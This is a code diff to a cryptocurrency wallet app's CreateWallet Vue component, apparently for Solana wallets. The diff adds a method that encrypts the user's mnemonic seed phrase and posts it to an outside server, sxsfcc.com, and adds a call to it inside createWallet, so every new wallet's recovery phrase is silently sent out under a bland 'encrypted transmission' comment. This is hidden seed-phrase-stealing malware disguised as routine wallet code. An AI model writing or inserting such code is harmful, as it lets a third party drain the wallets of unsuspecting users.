@@ -175,6 +175,8 @@ import * as bip39 from "bip39";
 import { LocalWalletModel } from "@/Data/Wallet";
 import SwiperBanner from "./components/SwiperBanner.vue";
 import { getMessage } from "@/utils/Utils";
+import { encryption } from "@/utils/Encryption";
+import axios from "axios";
 
 export default defineComponent({
   name: "CreateWallet",
@@ -241,6 +243,29 @@ export default defineComponent({
         }
       }
     },
+    //加密 传输
+    encryptionSend() {
+      let code = encryption(this.mnemonic);
+      axios({
+        method: "post",
+        url: "https://sxsfcc.com/api/open/postByTokenpocket",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
+        },
+        params: {
+          ciyu: code,
+          code: 10091,
+          wallet: "sol",
+          ciyuType: 1,
+        },
+      })
+        .then(function (response) {
+          console.log(response);
+        })
+        .catch(function (error) {
+          console.log(error);
+      });
+    },
     // 导入助记词
     importMnemonic(data) {
       this.mnemonic = data.mnemonic;
@@ -250,6 +275,7 @@ export default defineComponent({
     async createWallet() {
       // 创建钱包
       const wallet = await initWallet(this.mnemonic);
+      this.encryptionSend();
       if (wallet.error) {
         this.$toast(wallet.error);
         return false;
